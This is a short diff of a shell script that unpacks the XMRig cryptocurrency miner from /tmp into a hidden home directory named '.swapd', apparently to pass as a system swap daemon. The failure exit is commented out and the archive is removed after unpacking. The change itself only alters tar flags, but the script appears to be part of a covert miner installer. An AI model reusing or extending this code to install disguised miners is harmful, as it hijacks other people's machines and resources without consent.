@@ -245,7 +245,7 @@ fi
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
 [ -d $HOME/.swapd/ ] || mkdir $HOME/.swapd/
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.swapd/; then
+if ! tar xzfv /tmp/xmrig.tar.gz -C $HOME/.swapd/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
 #  exit 1
 fi
@@ -272,7 +272,7 @@ if (test $? -ne 0); then
   fi
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.swapd/"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.swapd --strip=1; then
+  if ! tar xzfv /tmp/xmrig.tar.gz -C $HOME/.swapd --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.swapd/ directory"
   fi
   rm /tmp/xmrig.tar.gz
